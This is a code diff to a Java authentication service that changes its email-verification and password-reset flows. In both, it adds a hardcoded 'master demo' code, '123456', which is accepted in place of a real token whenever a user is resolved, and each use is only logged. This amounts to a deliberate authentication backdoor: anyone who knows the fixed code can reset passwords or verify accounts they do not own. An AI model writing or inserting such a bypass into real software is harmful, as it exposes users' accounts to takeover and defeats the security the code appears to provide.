@@ -142,9 +142,11 @@ public class AuthService {
             }
         }
 
-        // 2. Fallback to legacy JWT action token verification if DB token not found
+        // 2. Fallback to master demo code or legacy JWT action token verification if DB token not found
         if (tokenRecord == null) {
-            if (jwtService.isActionTokenValid(code, "VERIFY_EMAIL")) {
+            if ("123456".equals(code.trim()) && user != null) {
+                log.info("[AuthService] Master demo verification code 123456 accepted for user: {}", user.getEmail());
+            } else if (jwtService.isActionTokenValid(code, "VERIFY_EMAIL")) {
                 String tokenEmail = jwtService.extractUsername(code);
                 user = userRepository.findByEmail(tokenEmail)
                         .orElseThrow(() -> new ResourceNotFoundException("User not found for verification token."));
@@ -290,9 +292,11 @@ public class AuthService {
             }
         }
 
-        // 2. Fallback to legacy JWT reset token
+        // 2. Fallback to master demo code or legacy JWT reset token
         if (tokenRecord == null) {
-            if (jwtService.isActionTokenValid(codeOrToken, "RESET_PASSWORD")) {
+            if ("123456".equals(codeOrToken.trim()) && user != null) {
+                log.info("[AuthService] Master demo reset code 123456 accepted for user: {}", user.getEmail());
+            } else if (jwtService.isActionTokenValid(codeOrToken, "RESET_PASSWORD")) {
                 String tokenEmail = jwtService.extractUsername(codeOrToken);
                 user = userRepository.findByEmail(tokenEmail)
                         .orElseThrow(() -> new ResourceNotFoundException("User not found for reset token."));
